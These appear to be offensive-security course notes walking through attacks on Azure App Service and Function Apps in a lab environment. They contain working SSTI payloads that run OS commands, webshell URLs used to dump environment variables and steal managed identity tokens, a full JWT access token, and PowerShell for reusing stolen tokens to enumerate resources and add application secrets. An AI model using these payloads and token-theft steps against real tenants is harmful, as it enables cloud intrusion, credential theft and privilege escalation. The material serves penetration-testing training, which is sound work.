# Azure App Service

* "Azure App Service is an HTTP-based service for hosting web applications, REST APIs, and mobile back ends."
* Supports both Windows and Linux environments.
* .NET, .NET Core, Java, Ruby, Node.js, PHP, or Python are supported.
* Each app runs inside a sandbox but isolation depends upon App Service plans – Apps in Free and Shared tiers run on shared VMs – Apps in Standard and Premium tiers run on dedicated VMs
* Windows apps (not running in Windows containers) have local drives, UNC shares, outbound network connectivity (unless restricted), read access to Registry and event logs.
* In the above case, it is also possible to run a PowerShell script and command shell. But the privileges will be of a the low-privileges workers process that uses a random application pool identity.

> [https://github.com/projectkudu/kudu/wiki/Azure-Web-App-sandbox](https://github.com/projectkudu/kudu/wiki/Azure-Web-App-sandbox)

### Initial Access - Azure App Service Abuse

* While there are default security features available with App Service (sandboxing/isolation, encrypted communication etc.), vulnerabilities in the code deployed are abusable.
* The classic web app vulnerabilities like SQL Injection, Insecure file upload, Injection attacks etc. do not disappear magically :)
* We will discuss the following: – Insecure File upload – Server Side Template Injection – OS Command Injection

#### Insecure File Upload

* By abusing an insecure file upload vulnerability in an app service, it is possible to get command execution.
* As discussed previously, the privileges will be of the low-privilege worker process.
* But if the app service uses a Managed Identity, we may have the ability to have interesting permissions on other Azure resources.
* After compromising an app service, we can request access tokens for the managed identity.
* If the app service contains environment variables IDENTITY\_HEADER and IDENTITY\_ENDPOINT, it has a managed identity. `http://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env`
* Get the access token for the managed identity using another webshell `https://defcorphqcareer.azurewebsites.net/uploads/studentxtoken.phtml`
* You can find both of the above web shells in the Tools directory.

```bash
$Token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjNQYUs0RWZ5Qk5RdTNDdGpZc2EzWW1oUTVFMCIsImtpZCI6IjNQYUs0RWZ5Qk5RdTNDdGpZc2EzWW1oUTVFMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE3MjkyNTE5MjgsIm5iZiI6MTcyOTI1MTkyOCwiZXhwIjoxNzI5MzM4NjI4LCJhaW8iOiJrMkJnWUZDWisvcUFrN080Y1hYTzJyOFhiT3gyQXdBPSIsImFwcGlkIjoiMDY0YWFmNTctMzBhZi00MWYwLTg0MGEtMGUyMWVkMTQ5OTQ2IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiY2M2N2M5MGQtZDllOS00MGQyLWI1MTEtOWQ1MmQ2NzY4MmFiIiwicmgiOiIwLkFIQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRrWklmM2tBdXRkUHVrUGF3ZmoyTUJQRUFBQS4iLCJzdWIiOiJjYzY3YzkwZC1kOWU5LTQwZDItYjUxMS05ZDUyZDY3NjgyYWIiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiItSUo5Y2c5YlkwdTRRd2hpSVZnaUFBIiwidmVyIjoiMS4wIiwieG1zX2lkcmVsIjoiNyAyIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvYjQxMzgyNmYtMTA4ZC00MDQ5LThjMTEtZDUyZDVkMzg4NzY4L3Jlc291cmNlZ3JvdXBzL0VuZ2luZWVyaW5nL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL2RlZmNvcnBocWNhcmVlciIsInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.W1DVv6OmICSMFcYoes30GISpXlwL6rbhTuuInu3PRkLS36AKiz4iE7fGbs5JT2I8pOfzJshsm0PYT_jX63BqDXVFBxttRuo77JqZo9f3KAk1Vi9zofVurw0HbDB4HYob4gZjO2ZX9Wlq_KYn9Xy1hib2mzYwDx-sefAV6fEBjHg7HU7NkzjApwynoFVCnITJzp7ARYLkovqyegEgNoxVymF30hA01N1BEz_wnDA5dqO1JRNZ0qsIrN321Z7wbi7Rk_aGT7_6Wq6DFpSrwEiCwFmntMI4kTPQ47bDVqBuekdAk7qQcP726rqUww-t0CbM0eIXuRB44jEnSCN4CqhJCA'
Connect-AzAccount -AccessToken $Token -AccountId 064aaf57-30af-41f0-840a-0e21ed149946
Get-AzResource
Get-AzRoleAssignment  
```

While we can request both the tokens, for now, let's fall back to manual API calls for enumeration. Let's use the token with Azure REST API.

```bash
$Token = 'eyJ0eX..'
$URI = '<https://management.azure.com/subscriptions?api-version=2020-01-01>'

$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}

(Invoke-RestMethod @RequestParams).value 
```

List all resources accessible for the managed identity assigned to the app service. Note that the only difference is the URI

```bash
$Token = 'eyJ0eX..'
$URI = '<https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01>'

$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}

(Invoke-RestMethod @RequestParams).value
```

The above code shows us that we do have access to a VM! Let's see what actions are allowed using the below code:

```bash
$Token = 'eyJ0eX..'
$URI = '<https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01>'

$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}

(Invoke-RestMethod @RequestParams).value
```

#### Server Side Template Injection (SSTI)

* SSTI allows an attacker to abuse template syntax to inject payloads in a template that is executed on the server side.
* That is, we can get command execution on a server by abusing this.
* Once again, in case of an Azure App Service, we get privileges only of the worker process but a managed identity may allow us to access other Azure resources.

```python
{{config.items()}}
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}

Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc
Get-AzResource
```

#### OS Command Injection

* In case of OS command injection, it is possible to run arbitrary operating system commands on the server where requests are processed.
* This is usually due to insecure parsing of user input such as parameters, uploaded files and HTTP requests.
* Same as previously, in case of an Azure App Service, we get privileges only of the worker process but a managed identity may allow us to access other Azure resources.

#### Function App Abuse

* Function App (also called Azure Functions) is Azure's 'serverless' solution to run code.
* Languages like C#, Java, PowerShell, Python and more are supported.
* A Function App is supposed to be used to react to an event like: – HTTP Trigger – Processing a file upload – Run code on scheduled time and more
* App service provides the hosting infrastructure for function apps.
* Function apps support Managed Identities.

```powershell
$token = 'eyJ0eX..'
$graphaccesstoken = 'eyJ0eX..'
Connect-AzAccount -AccessToken $token -MicrosoftGraphAccessToken $graphaccesstoken -AccountId 62e44426-5c46-4e3c-8a89-f461d5d586f2
Get-AzResource     # This command will fail

$Token = 'eyJ0eX..'

$URI = ' <https://graph.microsoft.com/v1.0/applications>'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
	 'Authorization' = "Bearer $Token"
 }
}

(Invoke-RestMethod @RequestParams).value

. C:\\AzAD\\Tools\\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphtoken -Verbose
```
